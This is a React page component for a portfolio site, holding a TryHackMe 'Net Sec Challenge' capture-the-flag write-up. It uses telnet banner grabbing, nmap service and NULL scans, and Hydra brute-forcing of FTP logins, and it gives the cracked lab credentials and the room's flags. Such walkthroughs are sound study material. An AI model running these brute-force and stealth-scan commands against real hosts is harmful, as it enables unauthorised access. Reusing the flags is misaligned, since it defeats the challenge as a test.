const IMG_BASE = 'https://ej-edwards.github.io/Portfolio-Website/pages/screenshotsproof/NetSec%20THM';

export default function WriteupNetSec() {
  return (
    <div className="page-content writeup">
      <h1>THM: Net Sec Challenge</h1>
      <div className="writeup-meta">
        <span className="tag">TryHackMe</span>
        <span className="tag">Network Security</span>
        <span className="tag">Nmap</span>
        <span className="tag">Enumeration</span>
      </div>

      <h2>Overview</h2>
      <p>
        The NetSec Challenge on TryHackMe is a medium-difficulty room focused on network
        security fundamentals, including reconnaissance, service enumeration, and
        protocol analysis. It emphasizes identifying exposed services, interacting with them
        using tools such as Nmap, Telnet, and Hydra, and understanding how different
        network protocols can be leveraged during an assessment.
      </p>

      <h2>Challenge 1 — HTTP Server Header Flag</h2>
      <p>Step 1 — Connect to the target&rsquo;s HTTP service on port 80 using telnet:</p>
      <pre className="code-block">telnet 10.64.139.34 80</pre>
      <p>Step 2 — Send a manual HTTP GET request with a Host header, then press Enter twice:</p>
      <pre className="code-block">{`GET / HTTP/1.1
host: telnet`}</pre>
      <p>Step 3 — Examine the response headers. The Server header contains the flag:</p>
      <pre className="code-block">{`HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "229449419"
Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
Content-Length: 226
Date: Thu, 19 Mar 2026 13:03:26 GMT
Server: lighttpd THM{web_server_25352}`}</pre>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-telnet-http.png`}
        alt="Telnet HTTP request showing Server header with flag"
        loading="lazy"
      />
      <p className="flag">Flag: <code>THM&#123;web_server_25352&#125;</code></p>

      <h2>Challenge 2 — SSH Server Header Flag</h2>
      <p>Step 1 — Connect to the target&rsquo;s SSH service on port 22 using telnet:</p>
      <pre className="code-block">telnet 10.64.139.34 22</pre>
      <p>The SSH banner reveals the flag.</p>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-ssh.png`}
        alt="Telnet SSH request showing Server header with flag"
        loading="lazy"
      />
      <p className="flag">Flag: <code>THM&#123;946219583339&#125;</code></p>

      <h2>Challenge 3 — FTP Server Version</h2>
      <p>Step 1 — Scan for the FTP service on a nonstandard port:</p>
      <pre className="code-block">nmap -sS -sV 10.64.139.34 -p 1-11000</pre>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-ftp.png`}
        alt="Nmap scan showing FTP service version"
        loading="lazy"
      />
      <p className="flag">Version: <code>vsftpd 3.0.3</code></p>

      <h2>Challenge 4 — FTP Flag via Brute Force</h2>
      <p>Step 1 — Brute-force FTP credentials for user eddie on port 10021:</p>
      <pre className="code-block">hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.64.139.34 ftp -s 10021 -v</pre>
      <p>Hydra finds the password: <code>eddie:jordan</code></p>

      <p>Step 2 — Do the same for user quinn:</p>
      <pre className="code-block">hydra -l quinn -P /usr/share/wordlists/rockyou.txt 10.64.139.34 ftp -s 10021 -v</pre>
      <p>Hydra finds the password: <code>quinn:andrea</code></p>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-social.png`}
        alt="Hydra brute-force results for eddie and quinn FTP credentials"
        loading="lazy"
      />

      <p>Step 3 — Log in as eddie — directory is empty:</p>
      <pre className="code-block">{`ftp 10.64.139.34 10021
Name: eddie
Password: jordan`}</pre>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-eddie.png`}
        alt="FTP login as eddie showing empty directory listing"
        loading="lazy"
      />

      <p>Step 4 — Log in as quinn and find the flag file:</p>
      <pre className="code-block">{`ftp 10.64.139.34 10021
Name: quinn
Password: andrea
ftp> ls
-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt`}</pre>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-quinn.png`}
        alt="FTP login as quinn showing ftp_flag.txt in directory listing"
        loading="lazy"
      />

      <p>Step 5 — Download the flag file:</p>
      <pre className="code-block">{`ftp> ascii
200 Switching to ASCII mode.
ftp> get ftp_flag.txt`}</pre>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-quinget.png`}
        alt="FTP download of ftp_flag.txt from quinn's account"
        loading="lazy"
      />

      <p>Step 6 — View the contents of the downloaded flag file:</p>
      <pre className="code-block">cat ftp_flag.txt</pre>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-quinviewfile.png`}
        alt="Contents of ftp_flag.txt showing the flag"
        loading="lazy"
      />
      <p className="flag">Flag: <code>THM&#123;321452667098&#125;</code></p>

      <h2>Challenge 5 — Covert Scan Flag</h2>
      <p>Step 1 — Browse to <code>http://10.64.139.34:8080</code>. The page presents a challenge requiring you to scan the target without being detected.</p>
      <p>Step 2 — Use an Nmap NULL scan to probe the target stealthily:</p>
      <pre className="code-block">nmap -sN 10.64.139.34</pre>
      <img
        className="writeup-screenshot"
        src={`${IMG_BASE}/netsec-covert.png`}
        alt="Nmap NULL scan result for covert scanning challenge"
        loading="lazy"
      />
      <p>Step 3 — Refresh the page to collect the flag.</p>
      <p className="flag">Flag: <code>THM&#123;f7443f99&#125;</code></p>

      <h2>Summary</h2>
      <p>
        I learned passive reconnaissance techniques and how to use various tools to
        gather information without being detected.
      </p>

      <h2>Tools Used</h2>
      <div className="quote-block">
        <p>Nmap — port scanning and service detection</p>
        <p>Telnet / Netcat — manual service interaction</p>
        <p>Hydra — credential brute-forcing</p>
      </div>
    </div>
  );
}
